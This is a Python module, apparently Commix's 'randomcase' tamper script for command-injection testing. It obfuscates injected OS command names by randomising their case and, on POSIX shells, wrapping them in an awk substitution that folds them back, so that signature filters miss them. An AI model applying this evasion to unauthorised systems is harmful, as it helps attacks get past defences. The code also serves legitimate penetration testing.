#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from random import choice
from src.utils import settings
from src.core.controller import checks

"""
About: Replaces each character in a user-supplied OS command's name with a random case.
Notes: Only the name is varied, on either target: the fold that lowers it back on a POSIX shell
       would lower an argument's own letters with it, and the command was asked for with the
       letters it was asked for. On Windows nothing has to fold it back at all, 'cmd.exe'
       resolving a name without regard to case.
       The fold is read by 'awk', which takes the name as an argument - a pipe into 'tr' would be
       an operator the payload is not proving.
       The character ranges are quoted with "'", which is the one quote neither an
       evaluated string nor the shell inside it is already using.
"""

__tamper__ = "randomcase"
__priority__ = settings.PRIORITY.HIGH

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Folded back to lower case by awk, which takes the name as an argument rather than through a pipe.
_FOLD = "'BEGIN{print(tolower(ARGV[1]))}'"

"""
Every character's case chosen independently, so two letters - the shortest a real command ever
is - still come out matching the original's case throughout one time in two: a signature over the
literal, unmixed word is still caught as often as it is dodged. Retried until at least one letter
actually differs in case from the rest, the way the result is supposed to read in the first place -
skipped only where there are fewer than two letters to vary at all, since no retry would ever end.
"""
def _mixed_case(cmd):
  if sum(char.isalpha() for char in cmd) < 2:
    return ''.join(choice((str.upper, str.lower))(char) for char in cmd)
  while True:
    candidate = ''.join(choice((str.upper, str.lower))(char) for char in cmd)
    if candidate not in (candidate.lower(), candidate.upper()):
      return candidate

# Vary the case of the command's letters, folded back where the shell cares which case it was given.
def tamper(payload):
  # 'cmd.exe' reads the mixed case as the command it names, so it is handed over as it is - and only
  # the name is varied, an argument being the command's own to read however it reads it.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.EXPLOITATION_PHASE and settings.USER_APPLIED_CMD:
      source = payload if settings.USER_APPLIED_CMD in payload else settings.RAW_PAYLOAD
      if settings.USER_APPLIED_CMD in source:
        name, separator, arguments = settings.USER_APPLIED_CMD.partition(settings.SINGLE_WHITESPACE)
        payload = source.replace(settings.USER_APPLIED_CMD, _mixed_case(name) + separator + arguments)
        if len(settings.WHITESPACES) != 0:
          payload = payload.replace(settings.SINGLE_WHITESPACE, settings.WHITESPACES[0])
    return payload
  # An empty 'USER_APPLIED_CMD' is still "in" any string, so the replace below would otherwise
  # insert the obfuscated-empty-string construct between every character of the payload - a
  # verification litmus built after a finding confirms (and so after exploitation phase starts)
  # has no command of its own to case-randomize at all.
  if settings.EXPLOITATION_PHASE and settings.USER_APPLIED_CMD:
    source = payload if settings.USER_APPLIED_CMD in payload else settings.RAW_PAYLOAD
    if settings.USER_APPLIED_CMD in source:
      # Only the name, since the fold would lower an argument's own letters along with it - and the
      # command was asked for with the letters it was asked for.
      name, separator, arguments = settings.USER_APPLIED_CMD.partition(settings.SINGLE_WHITESPACE)
      mixed_case = _mixed_case(name)
      # 'rev' runs before this one and this rebuilds what it wrote, so where both are in use the two
      # rewrites are spelled out together rather than one wrapped around the other.
      # The fold on its own is one statement and needs no operator at all. Reading the name back
      # from its end as well needs one, so that form is chosen the way 'rev' chooses its own.
      if not settings.TAMPER_SCRIPTS["rev"]:
        program = _FOLD
      else:
        mixed_case = mixed_case[::-1]
        payload_separator = checks.current_separator()
        if not checks.awk_separator_usable(payload_separator):
          warn_msg = "Nothing reads a name back from its end without an operator of its own, and "
          warn_msg += "none of the ones that do is the separator under test. Skipping tamper script."
          settings.print_once(warn_msg)
          return payload
        program = checks.awk_reverse_program(payload_separator, fold=True)
      folded = "awk" + settings.SINGLE_WHITESPACE + program + settings.SINGLE_WHITESPACE + mixed_case
      if settings.USE_BACKTICKS:
        random_case_cmd = "\\`" + folded + "\\`"
      else:
        random_case_cmd = settings.CMD_SUB_PREFIX + folded + settings.CMD_SUB_SUFFIX
      # Applied to the payload as handed over, not to the untouched original: the scripts run in
      # order, and reaching back past the ones before would throw their work away.
      payload = source.replace(settings.USER_APPLIED_CMD, random_case_cmd + separator + arguments)
      if len(settings.WHITESPACES) != 0:
        payload = payload.replace(settings.SINGLE_WHITESPACE, settings.WHITESPACES[0])
  return payload

# eof
